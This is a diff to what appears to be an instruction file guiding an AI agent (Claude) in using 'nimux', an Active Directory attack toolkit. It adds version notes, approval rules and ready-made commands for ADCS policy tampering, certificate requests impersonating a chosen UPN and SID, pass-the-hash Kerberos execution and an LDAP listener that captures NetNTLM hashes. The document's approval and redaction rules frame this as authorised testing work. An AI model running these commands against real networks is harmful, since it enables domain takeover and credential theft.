@@ -25,6 +25,16 @@ socks, secrets, dcsync, mssql, postgres, mysql, ssh, ftp, vnc, nfs,
 afp, webdav, http, rdp, put, get, ls, mkdir, rm
 ```
 
+
+## Version Awareness
+
+Agents should treat local `nimux --help` as authoritative, but the 1.0.3 and 1.0.4 releases added behavior that older prompts may miss:
+
+- 1.0.3 stabilized BloodHound Legacy output and ADCS RPC workflows: `--bloodhound --legacy`, ACL/object-control export, native `ICertAdminD2` policy get/set, RPC certificate requests, PKCS#12 output, PKINIT ccache generation, and Kerberos execution with explicit `--krb5-config`.
+- 1.0.4 added LDAP capture server support and polished ADCS policy output: `nimux ldap --server`, `--srvhost`, `--srvport`, random or fixed `--challenge`, repeated LDAP captures, readable `DisableExtensionList` get output, and empty-value clearing for `--adcs-set-disable-extension-list`.
+
+Do not assume these flags exist on older binaries. Check the local version and help output before building a workflow.
+
 ## Safety Rules
 
 Claude must ask for explicit approval before:
@@ -38,6 +48,9 @@ Claude must ask for explicit approval before:
 - creating, linking, or editing GPOs
 - adding certificate mappings
 - adding shadow credentials
+- changing ADCS policy values
+- requesting certificates that create key material
+- starting LDAP capture listeners
 - deploying SOCKS helpers
 - using a pivot to reach a new internal network segment
 
@@ -66,6 +79,23 @@ nimux krb5conf <dc> -d <domain> --out <domain>.krb5.conf
 nimux kerberos <dc> -u <user> -p '<password>' -d <domain> --request kinit --out <user>.ccache
 nimux winrm <host> -k --ccache <user>.ccache --krb5-config <domain>.krb5.conf -u <user> -d <domain> --spn WSMAN --cmd whoami --json
 ```
+
+
+## AD CS and LDAP Capture
+
+Claude should verify local help before using 1.0.3/1.0.4 ADCS and LDAP capture flags. Common forms are:
+
+```bash
+nimux ldap <dc> -u <user> -p '<password>' -d <domain> --bloodhound --legacy --bloodhound-out bloodhound-legacy.zip
+nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-get-disable-extension-list --json
+nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-set-disable-extension-list 1.3.6.1.4.1.311.25.2
+nimux ldap <dc> -u <ca-manager> -H <nt_hash> -d <domain> --adcs-policy --ca '<ca-name>' --adcs-set-disable-extension-list ''
+nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-request --adcs-rpc --ca '<ca-name>' --template <template> --upn <user@domain> --sid <objectSid> --out cert-out.pfx
+nimux ldap <dc> -u <user> -p '<password>' -d <domain> --adcs-auth --upn <user@domain> --pfx cert-out.pfx --ccache user.ccache --krb5-config <domain>.krb5.conf
+nimux ldap --server --srvhost 0.0.0.0 --srvport 2222
+```
+
+ADCS policy changes, certificate requests, service restarts, LDAP capture listeners, and Kerberos execution require explicit approval. Redact PFX/private key material, passwords, and NetNTLM captures by default.
 
 ## Native Pivoting
 
